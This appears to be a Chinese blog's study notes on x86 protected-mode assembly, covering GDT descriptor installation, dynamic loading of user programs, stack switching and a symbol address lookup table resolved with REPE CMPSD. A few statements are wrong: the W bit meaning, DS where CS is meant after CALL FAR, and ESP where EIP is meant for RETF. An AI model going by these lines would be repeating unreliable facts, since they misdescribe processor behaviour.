       mov ecx,0x00409200                 ;字节粒度的数据段描述符
       call sys_routine_seg_sel:make_seg_descriptor
       call sys_routine_seg_sel:set_up_gdt_descriptor
       mov [edi+0x04],cx 
</code></pre>
<p>使用<mark>make-seg_descriptor</mark>创建描述符、使用<mark>set_up_gdt_descriptor</mark>安装描述符。</p>
<p>其中头部段描述符：</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/144616b2a2b154bd174b8d71383ff689.png" class="">

<ul>
<li>G位：0表示段界限以字节为单位</li>
<li>P位：1表示段存在</li>
<li>S位：1表示这是一个存储器的段描述符</li>
<li>X位：0表示这是一个数据段</li>
<li>E位：0表示段向上扩展</li>
<li>W位：0表示可读可写</li>
</ul>
<h2 id="16-用SGDT和MOVZX指令确定GDT的位置"><a href="#16-用SGDT和MOVZX指令确定GDT的位置" class="headerlink" title="16. 用SGDT和MOVZX指令确定GDT的位置"></a>16. 用SGDT和MOVZX指令确定GDT的位置</h2><p><mark>sgdt m</mark>指令：将<mark>GDTR</mark>的内容保存到内存地址<mark>m</mark>处</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/8ee964a20a641a57cd2df08e5c65c163.png" class="">

<p><mark>movzx</mark>指令：0扩展传送指令</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/a7b3bddccde1412511d349b08ec6851b.png" class="">
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/894b778c290e658fb31380b2feab024e.png" class="">

<p><mark>movsx</mark>：符号位扩展传送指令</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/87fd4f6a3c17dfc49006dfa49461fa5e.png" class="">
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/0c0ba9317c35169c418216cb17d82d0c.png" class="">

<p>本节代码：<mark>GDTR</mark>是一个<mark>48</mark>位的寄存器高<mark>32</mark>位存储的内容是<mark>GDT起始线性地址</mark>低<mark>16</mark>位存储的内容是<mark>GDT的界限值</mark>，通过sgdt指令获取到GDTR的值之后提取低16位的界限值将<mark>界限值加1</mark>再加上<mark>GDT的起始线性地址</mark>即可得到下一个描述符的线性地址，后面就可以使用这个线性地址来安装新的描述符。</p>
<pre><code class="assembly">set_up_gdt_descriptor:                      ;在GDT内安装一个新的描述符
                                            ;输入：EDX:EAX=描述符 
                                            ;输出：CX=描述符的选择子
         push eax
         push ebx
         push edx
      
         push ds
         push es
      
         mov ebx,core_data_seg_sel          ;切换到核心数据段
         mov ds,ebx

         sgdt [pgdt]                        ;以便开始处理GDT

         mov ebx,mem_0_4_gb_seg_sel
         mov es,ebx

         movzx ebx,word [pgdt]              ;GDT界限 
         inc bx                             ;GDT总字节数，也是下一个描述符偏移 
         add ebx,[pgdt+2]                   ;下一个描述符的线性地址 
      
</code></pre>
<h2 id="17-安装新描述符并生成选择子"><a href="#17-安装新描述符并生成选择子" class="headerlink" title="17. 安装新描述符并生成选择子"></a>17. 安装新描述符并生成选择子</h2><p>接上一节代码：</p>
<pre><code class="assembly">         mov [es:ebx],eax
         mov [es:ebx+4],edx
      
         add word [pgdt],8                  ;增加一个描述符的大小   
      
         lgdt [pgdt]                        ;对GDT的更改生效 
       
         mov ax,[pgdt]                      ;得到GDT界限值
         xor dx,dx
         mov bx,8
         div bx                             ;除以8，去掉余数
         mov cx,ax                          
         shl cx,3                           ;将索引号移到正确位置 

         pop es
         pop ds

         pop edx
         pop ebx
         pop eax
      
         retf 
</code></pre>
<p>安装了新的描述符之后使用<mark>lgdt[pgdt]</mark>指令使得新的描述符生效，然后将GDT的界限值除以8得到描述符的索引号，再将索引号左移三位右边补零生成新的选择子。</p>
<h2 id="18-安装用户程序的段描述符并回填选择子"><a href="#18-安装用户程序的段描述符并回填选择子" class="headerlink" title="18. 安装用户程序的段描述符并回填选择子"></a>18. 安装用户程序的段描述符并回填选择子</h2><p>代码如下：</p>
<pre><code class="assembly">;建立程序头部段描述符
         pop edi                            ;恢复程序装载的首地址 
         mov eax,edi                        ;程序头部起始线性地址
         mov ebx,[edi+0x04]                 ;段长度
         dec ebx                            ;段界限 
         mov ecx,0x00409200                 ;字节粒度的数据段描述符
         call sys_routine_seg_sel:make_seg_descriptor
         call sys_routine_seg_sel:set_up_gdt_descriptor
         mov [edi+0x04],cx               
</code></pre>
<p>回填选择子：</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/99972661419e171cf0c3cdaaafd94d1f.png" class="">

<p>之后用户程序头部的<mark>0x04</mark>处就是<mark>选择子</mark>了，而且只用到了低32位，高32位还是原来的值</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/6d34a115a6fee41642876058aa070a2c.png" class="">

<p>接着创建代码段描述符：</p>
<pre><code class="assembly">         ;建立程序代码段描述符
         mov eax,edi
         add eax,[edi+0x0c]                 ;代码起始线性地址
         mov ebx,[edi+0x10]                 ;段长度
         dec ebx                            ;段界限
         mov ecx,0x00409800                 ;字节粒度的代码段描述符
         call sys_routine_seg_sel:make_seg_descriptor
         call sys_routine_seg_sel:set_up_gdt_descriptor
         mov [edi+0x14],cx   
</code></pre>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/e38333b91447d2184bcae4ae6b518ed4.png" class="">
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/90d787418a73c3b0e54694974514c50a.png" class="">

<p>之后就进行安装和加载描述符，后面还有数据段和栈段描述符：流程基本都是一样的</p>
<pre><code class="assembly"> ;建立程序数据段描述符
         mov eax,edi
         add eax,[edi+0x14]                 ;数据段起始线性地址
         mov ebx,[edi+0x18]                 ;段长度
         dec ebx                            ;段界限
         mov ecx,0x00409200                 ;字节粒度的数据段描述符
         call sys_routine_seg_sel:make_seg_descriptor
         call sys_routine_seg_sel:set_up_gdt_descriptor
         mov [edi+0x14],cx

 ;建立程序堆栈段描述符      
        mov eax,edi
        add eax,[edi+0x1c]					;栈段起始线性地址
        mov ebx,[edi+0x20]					;段长度
        dec ebx								;段界限
        mov ecx,0x00409200					；字节粒度的数据段描述符
        call sys_routine_seg_sel:make_seg_descriptor
        call sys_routine_seg_sel:set_up_gdt_descriptor
        mov [edi+0x1c],cx
</code></pre>
<h2 id="19-用户程序的执行和退出"><a href="#19-用户程序的执行和退出" class="headerlink" title="19. 用户程序的执行和退出"></a>19. 用户程序的执行和退出</h2><p>从<mark>load_relocate_program</mark>程序返回之前将用户程序头部段的选择子保存在<mark>AX</mark>中。</p>
<pre><code class="assembly">SECTION core_code vstart=0
;-------------------------------------------------------------------------------
load_relocate_program:                      ;加载并重定位用户程序
                                            ;输入：ESI=起始逻辑扇区号
                                            ;返回：AX=指向用户程序头部的选择子 
         push ebx
         push ecx
         push edx
         push esi
         push edi
      
         push ds
         push es
      
         mov eax,core_data_seg_sel
         mov ds,eax                         ;切换DS到内核数据段
       
         mov eax,esi                        ;读取程序头部数据 
         mov ebx,core_buf                        
         call sys_routine_seg_sel:read_hard_disk_0       
         
         ...
         ...
         ...
         
         mov ax,[es:0x04]

         pop es                             ;恢复到调用此过程前的es段 
         pop ds                             ;恢复到调用此过程前的ds段
      
         pop edi
         pop esi
         pop edx
         pop ecx
         pop ebx
      
         ret        
</code></pre>
<p>从<mark>load_relocate_program</mark>程序返回内核程序：</p>
<pre><code class="assembly">          call load_relocate_program
         mov ebx,do_status
         call sys_routine_seg_sel:put_string
      
         mov [esp_pointer],esp               ;临时保存堆栈指针
       
         mov ds,ax							 ;从load_relocate_program程序返回时，用户程序头部段选择子存在AX中

         call far [0x08]                     ;控制权交给用户程序（入口点）
                                             ;堆栈可能切换 
</code></pre>
<p>这条<mark>call far [0x08]</mark> 指令执行时，处理器用段寄存器<mark>DS</mark>访问用户程序头部段，从偏移为8的地方取出32位偏移量传送到指令指针<mark>EIP</mark>，再取出16位段选择子传送到段寄存器<mark>DS</mark>，然后处理器进入用户程序内部执行。<br>用户程序<mark>start</mark>代码：</p>
<pre><code class="assembly">SECTION code vstart=0

start:
         mov eax,ds		;此时DS指向用户程序头部段
         mov fs,eax		;但是我们不能失去对DS的追踪，所以使用其他FS段寄存器重新设置DS

         ;mov eax,[stack_seg]
         ;mov ss,eax
         ;mov esp,stack_end

         ;mov eax,[data_seg]
         ;mov ds,eax

         ;用户程序要做的事情（省略）

         retf                                     ;将控制权返回到系统

code_end:
</code></pre>
<p>从用户程序返回到内核代码段：</p>
<pre><code class="assembly">    call far [0x08]                     ;控制权交给用户程序（入口点）
                                        ;堆栈可能切换 
    
return_point:                           ;用户程序返回点
    mov eax,core_data_seg_sel           ;使ds指向核心数据段
    mov ds,eax
    
    mov eax,core_stack_seg_sel          ;切换回内核自己的堆栈
    mov ss,eax 
    mov esp,[esp_pointer]
    
    mov ebx,message_6
    call sys_routine_seg_sel:put_string
    
    ;这里可以放置清除用户程序各种描述符的指令
    ;也可以加载并启动其它程序
    
    hlt	;在主引导程序进入保护模式之前使用cli指令清除了中断，
        ;所以在这里用hlt指令让处理器停机之后不会被中断唤醒
</code></pre>
<h2 id="20-在虚拟机上观察内核的加载以及用户程序的执行与推出"><a href="#20-在虚拟机上观察内核的加载以及用户程序的执行与推出" class="headerlink" title="20. 在虚拟机上观察内核的加载以及用户程序的执行与推出"></a>20. 在虚拟机上观察内核的加载以及用户程序的执行与推出</h2><p>起始LBA扇区号：</p>
<ul>
<li>主引导程序：0</li>
<li>内核程序：1</li>
<li>用户程序：50</li>
</ul>
<p>VirtualBox虚拟机执行成功：</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/196c7eb008b6f6764d38d54857bbfa46.png" class="">

<p>Bochs虚拟机执行成功：</p>
<img src="/2022/12/11/25-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C/0df1110c1d014a7245f3fcb33df9f078.png" class="">

<p>可以自行调试观察<mark>EFLAGS、GDT、内核程序头部和用户程序头部</mark>内容以及栈的变化。</p>
]]></content>
      <categories>
        <category>X86汇编：实模式到保护模式</category>
      </categories>
      <tags>
        <tag>保护模式下的动态加载和执行</tag>
      </tags>
  </entry>
  <entry>
    <title>用户程序编程接口及其实现</title>
    <url>/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="01-内核与用户程序之间的栈切换问题"><a href="#01-内核与用户程序之间的栈切换问题" class="headerlink" title="01.内核与用户程序之间的栈切换问题"></a>01.内核与用户程序之间的栈切换问题</h2><p>从内核进入用户程序时，使用的是<mark>call far</mark>指令，这是一个过程调用指令，是需要使用<mark>retf</mark>指令返回的。过程调用需要隐式的栈操作，使用栈来保存返回地址，因此当<mark>call far</mark>指令执行时需要将下一条指令的地址压入当前正在使用的栈中保存，也就是内核的栈中。</p>
<span id="more"></span>

<p>用户程序：</p>
<pre><code class="assembly">start:
         mov eax,ds		;此时DS指向用户程序头部段
         mov fs,eax		;但是我们不能失去对DS的追踪，所以使用其他FS段寄存器重新设置DS

         mov ss, [fs:stack_seg]
         mov esp,stack_end

         ;mov eax,[data_seg]
         ;mov ds,eax

         ;用户程序要做的事情（省略）

         retf 
</code></pre>
<p>一旦将栈切换到用户程序自己的栈中，将无法返回内核，因为<mark>retf</mark>指令执行时要从栈中弹出内核的栈状态到<mark>CS</mark>和<mark>ESP</mark>。但是当前使用的时用户程序的栈而非内核的栈，这些地址时保存在内核的栈中的。</p>
<p>修改用户程序，在进入用户程序之后先保存内核栈的<mark>SS和ESP</mark>再使用用户程序自己的栈，在使用<mark>retf</mark>返回内核时再恢复栈为内核的栈地址：</p>
<p>添加用户栈常量：</p>
<pre><code class="assembly">SECTION data vstart=0

         os_ss             dw 0	;用于保存内核栈的状态
         os_esp            dd 0

         message_1         db  0x0d,0x0a,0x0d,0x0a
                           db  '**********User program is runing**********'
                           db  0x0d,0x0a,0

data_end:
</code></pre>
<p><mark>retf</mark>时恢复<mark>SS和ESP</mark></p>
<pre><code class="assembly">start:
         mov eax,ds		;此时DS指向用户程序头部段
         mov fs,eax		;但是我们不能失去对DS的追踪，所以使用其他FS段寄存器重新设置DS

         mov ds,[fs:data_seg] ;切换到用户程序自己的数据段

         mov [os_ss],ss       ;将ss的当前值保存到os_ss和os_esp
         mov [os_esp],esp

         mov ss,[fs:stack_seg] ;将栈切换到用户程序自己的栈
         mov esp,stack_end

         mov ss,[os_ss]       ;恢复内核栈的状态
         mov esp,[os_esp]

         ;用户程序要做的事情（省略）

         retf                                     ;将控制权返回到系统
</code></pre>
<p>因为我们在用户代码中保存了内核的栈状态<mark>SS、ESP</mark>，所以就不用在内核中再重复写代码恢复这个状态了。</p>
<ul>
<li>进入用户程序之前临时保存堆栈指针的指令</li>
<li>回到内核之后切换回内核自己堆栈的指令<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/ece9a96ffb6a138049089d2e4501acaa.png" class=""></li>
</ul>
<p>虚拟机验证：修改是可行的</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/6b36567294d1198d09571ace0663403c.png" class="">
<p><strong>虽然可以这样做，但是需要禁止这样的做法。</strong></p>
<ul>
<li><strong>首先因为用户程序不需要为内核提供服务，比如为内核保存栈状态等等</strong></li>
<li><strong>其次内核必须是稳定的，不能依赖于用户程序否则用户程序一旦出错内核也将崩溃是不行的</strong></li>
</ul>
<h2 id="02-内核中位用户程序提供编程支持"><a href="#02-内核中位用户程序提供编程支持" class="headerlink" title="02. 内核中位用户程序提供编程支持"></a>02. 内核中位用户程序提供编程支持</h2><p>在用户程序中暂时无法访问现存，在进入内核之前创建过一个显存的描述符由内核使用。因此我们知道显存的段选择子，在原则上就可以在用户程序中访问显存显示文本。也可以使用内核中的<mark>put_string</mark>例程来显示字符串。</p>
<p>代码如下：</p>
<ul>
<li>定义的字符串</li>
</ul>
<pre><code class="assembly">SECTION data vstart=0

         os_ss             dw 0	;用于保存内核栈的状态
         os_esp            dd 0

         message_1         db  0x0d,0x0a,0x0d,0x0a
                           db  '**********User program is runing**********'
                           db  0x0d,0x0a,0

data_end:
</code></pre>
<ul>
<li>使用显存的描述符</li>
</ul>
<pre><code class="assembly">start:
         mov eax,ds		;此时DS指向用户程序头部段
         mov fs,eax		;但是我们不能失去对DS的追踪，所以使用其他FS段寄存器重新设置DS

         mov ds,[fs:data_seg] ;切换到用户程序自己的数据段

         mov [os_ss],ss       ;将ss的当前值保存到os_ss和os_esp
         mov [os_esp],esp

         mov ss,[fs:stack_seg] ;将栈切换到用户程序自己的栈
         mov esp,stack_end
        
         mov ebx,message_1
         call 0x28:0		;0x28是内核公共历程段的选择子
         					;0是put_string例程在内核公共历程段内的偏移
         mov ss,[os_ss]     ;恢复内核栈的状态
         mov esp,[os_esp]

         ;用户程序要做的事情（省略）

         retf                                     ;将控制权返回到系统
</code></pre>
<p>虚拟机运行成功：</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/af5adf72e8ff8e697afd26a16f724fd4.png" class="">
<p>但是通常用户程序不可能知道内核的<mark>段选择子</mark>和内核中的<mark>例程</mark>，所以上述代码一般不会出现。但是用户程序也可以自己安装一些描述符在<mark>GDT</mark>中，如显存的段描述符，不过一般不能这样做，<mark>GDT</mark>只能给内核使用不然有可能会造成内核的崩溃。</p>
<p>所以处理器有了特权级<mark>DPL</mark>的概念，来限制用户程序的权限。但是内核会给用户程序提供一些例程，供其使用（<em>也可以在一定程度上减少用户程序重复造轮子</em>），也叫用户程序接口（API：Applicatio Programming Interface）。</p>
<h2 id="03-用户程序中的符号地址检索表"><a href="#03-用户程序中的符号地址检索表" class="headerlink" title="03. 用户程序中的符号地址检索表"></a>03. 用户程序中的符号地址检索表</h2><p>本节使用<mark>c13_mbr0.asm</mark>作为引导程序：首先创建一些初始的段描述符、进入保护模式、加载内核、对内和进行设置和重定位、最后将控制权交给内核跳转执行内核程序。</p>
<p>内核发布时需要向程序员发布一个内核编程手册，对于我们这个<mark>c13_core1.asm</mark>内核也有一个编程手册：</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/045ee1d4090c61889bf9cdc6eb188a8f.png" class="">
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/2b832ac9837b7415d63a77403641ae97.png" class="">
<p>符号地址检索表位于用户程序头部，当内核加载用户程序时需要对这个表进行处理，会将每一个字符串的名字替换成其在内核中的地址，包括段选择子和段内偏移量。如此一来标号处存储的就是对应例程在内核中的地址。在用户程序头部定义符号地址检索表<mark>SALT(Symbol Address Lookup Table)</mark>。<br>如下：</p>
<pre><code class="assembly">SECTION header vstart=0

         program_length   dd program_end          ;程序总长度#0x00
         
         head_len         dd header_end           ;程序头部的长度#0x04

         stack_seg        dd 0                    ;用于接收堆栈段选择子#0x08
         stack_len        dd 1                    ;程序建议的堆栈大小#0x0c
                                                  ;以4KB为单位
                                                  
         prgentry         dd start                ;程序入口#0x10 
         code_seg         dd section.code.start   ;代码段位置#0x14
         code_len         dd code_end             ;代码段长度#0x18

         data_seg         dd section.data.start   ;数据段位置#0x1c
         data_len         dd data_end             ;数据段长度#0x20
             
;-------------------------------------------------------------------------------
         ;符号地址检索表
         salt_items       dd (header_end-salt)/256 ;#0x24
         
         salt:                                     ;#0x28
         PrintString      db  '@PrintString'
                     times 256-($-PrintString) db 0
                     
         TerminateProgram db  '@TerminateProgram'
                     times 256-($-TerminateProgram) db 0
                     
         ReadDiskData     db  '@ReadDiskData'
                     times 256-($-ReadDiskData) db 0
                 
header_end:   
</code></pre>
<h2 id="04-内核程序中的符号地址检索表"><a href="#04-内核程序中的符号地址检索表" class="headerlink" title="04. 内核程序中的符号地址检索表"></a>04. 内核程序中的符号地址检索表</h2><p>本节主要讲了内核中的符号地址检索表<mark>SALT</mark>的内容，在<mark>c13_core1.asm</mark>中的定义如下：</p>
<pre><code class="assembly">SECTION core_data vstart=0                  ;系统核心的数据段
;-------------------------------------------------------------------------------
         pgdt             dw  0             ;用于设置和修改GDT 
                          dd  0

         ram_alloc        dd  0x00100000    ;下次分配内存时的起始地址

         ;符号地址检索表
         salt:
         salt_1           db  '@PrintString'
                     times 256-($-salt_1) db 0
                          dd  put_string
                          dw  sys_routine_seg_sel

         salt_2           db  '@ReadDiskData'
                     times 256-($-salt_2) db 0
                          dd  read_hard_disk_0
                          dw  sys_routine_seg_sel

         salt_3           db  '@PrintDwordAsHexString'
                     times 256-($-salt_3) db 0
                          dd  put_hex_dword
                          dw  sys_routine_seg_sel

         salt_4           db  '@TerminateProgram'
                     times 256-($-salt_4) db 0
                          dd  return_point
                          dw  core_code_seg_sel

         salt_item_len   equ $-salt_4
         salt_items      equ ($-salt)/salt_item_len
</code></pre>
<h2 id="05-串比较指令CMPS"><a href="#05-串比较指令CMPS" class="headerlink" title="05. 串比较指令CMPS"></a>05. 串比较指令CMPS</h2><p>内核启动流程：</p>
<ul>
<li>从主引导程序进入内核</li>
<li>显示一些文本信息、显示处理器品牌信息</li>
<li>调用<mark>load_relocate_program</mark>加载和重定位用户程序</li>
<li>显示文本信息</li>
<li>调转执行用户程序</li>
</ul>
<p>其中<mark>load_relocate_program</mark>中添加了对符号地址检索表的处理：</p>
<ul>
<li>读硬盘扇区，将用户程序读入内存，为用户程序的每个段创建描述符；</li>
<li>处理符号地址检索表，即将符号出的字符串替换成其对应例程在内存中的地址，替换成例程在内存中的<mark>段选择子</mark>和<mark>段内偏移量</mark>。如何知道每个字符串所代表的例程在内存中的地址呢？<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/ad854eef0591d42fe1ccce5858a97c02.png" class="">
将用户程序中的符号取出，依次和内核中的符号地址检索表中的内容进行比较，相同的话就是用内核中对应的后六个字节的<mark>段选择子</mark>和<mark>段内偏移量</mark>覆盖用户程序原先的符号，覆盖之后用户程序中存放的就是对应例程的<mark>段选择子</mark>和<mark>段内偏移量</mark>。</li>
<li>处理完<mark>SALT</mark>之后返回</li>
</ul>
<p>其中，使用字符串比较指令<mark>cmpsb、cmpsw、cmpsd、cmpsq</mark>进行字符串比较：</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/cb32bf565275d98327fe23c223c2751c.png" class="">


<h2 id="06-串比较的方向和重复前缀"><a href="#06-串比较的方向和重复前缀" class="headerlink" title="06. 串比较的方向和重复前缀"></a>06. 串比较的方向和重复前缀</h2><p><mark>CMPS</mark>指令只会执行一次，重复比较需要使用指令重复前缀<mark>rep</mark>。</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/f544652bb7f4ed2453d57b5826ea103d.png" class="">

<p><mark>rep</mark>重复前缀：指令每执行一次，<mark>CX/ECX/RCX</mark>值减1。</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/13cb4f393d56a743c45f57fc45018557.png" class="">

<p>如果总字节数除不尽的话，应该使用<mark>cmpsb</mark>，而不是<mark>cmpsw</mark>指令，<mark>CX、ECX、RCX</mark>设置的总字节数是字符串的长度，所以两个字符串长度要相等。</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/1b52744b5b7594ac73020c7bf1880bde.png" class="">

<p>重复前缀<mark>rep</mark>指令不会在比较字符串时做出判断，这个问题使用如下方法解决：</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/399ef3d5492da8102fdca97626a80bff.png" class="">

<p>例如指令，<mark>repe cmpsw</mark>，执行过程是：以字节为单位进行字符串比较，若相等则设置零标志位<mark>ZF = 1</mark>，也将<mark>CX/ECX/RCX</mark>减1，若<mark>CX/ECX/RCX</mark>不为零且<mark>ZF = 1</mark>，表示字符串相等继续比较，若在<mark>C<br>X/ECX/RCX</mark>不为零但是<mark>ZF = 0</mark>则表示当前字符串不相等，比较终止。</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/840e693515f2ec110ffa54d2cf589fc1.png" class="">

<p>字符串比较的完整过程：</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/f92bc1d8d48b0065e1f85321f6fd7f01.png" class="">

<h2 id="07-使用外循环依次取得用户SALT表中的每个条目"><a href="#07-使用外循环依次取得用户SALT表中的每个条目" class="headerlink" title="07. 使用外循环依次取得用户SALT表中的每个条目"></a>07. 使用外循环依次取得用户SALT表中的每个条目</h2><p>接05节：<br>在<mark>load_relocate_program</mark>中，添加了符号地址检索表<mark>SALT</mark>的重定位过程：</p>
<pre><code>SECTION core_code vstart=0
;-------------------------------------------------------------------------------
load_relocate_program:                      ;加载并重定位用户程序
                                            ;输入：ESI=起始逻辑扇区号
                                            ;返回：AX=指向用户程序头部的选择子
                                            
        ...
        ...
        ...
        

         ;重定位SALT
         mov eax,[edi+0x04]
         mov es,eax                         ;es -&gt; 用户程序头部 
         mov eax,core_data_seg_sel
         mov ds,eax
      
         cld

         mov ecx,[es:0x24]                  ;用户程序的SALT条目数
         mov edi,0x28                       ;用户程序内的SALT位于头部内0x2c处
  .b2: 
         push ecx
         push edi
      
         mov ecx,salt_items
         mov esi,salt
  .b3:
         push edi
         push esi
         push ecx

         mov ecx,64                         ;检索表中，每条目的比较次数 
         repe cmpsd                         ;每次比较4字节 
         jnz .b4
         mov eax,[esi]                      ;若匹配，esi恰好指向其后的地址数据
         mov [es:edi-256],eax               ;将字符串改写成偏移地址 
         mov ax,[esi+4]
         mov [es:edi-252],ax                ;以及段选择子 
  .b4:
      
         pop ecx
         pop esi
         add esi,salt_item_len
         pop edi                            ;从头比较 
         loop .b3
      
         pop edi
         add edi,256
         pop ecx
         loop .b2

         mov ax,[es:0x04]

         pop es                             ;恢复到调用此过程前的es段 
         pop ds                             ;恢复到调用此过程前的ds段
      
         pop edi
         pop esi
         pop edx
         pop ecx
         pop ebx
      
         ret
</code></pre>
<p>其中：在用户程序中，偏移<mark>为4</mark>的地方之前是用户程序头部段的长度，现在被修改为用户程序头部段的选择子。</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/cffe3bc20c22bb6c0d0838d5f97f1b38.png" class="">

<p>其中比较过程使用循环进行，外循环遍历用户程序、内存换遍历内核程序：</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/d9f76df51c8017be3e97601d9ba12156.png" class="">

<p>外循环：每执行一次都会使得<mark>EDI</mark>指向代表下一个例程名称字符串的首地址。</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/47b044824e22a668d5aeb2b50cd7b2bb.png" class="">


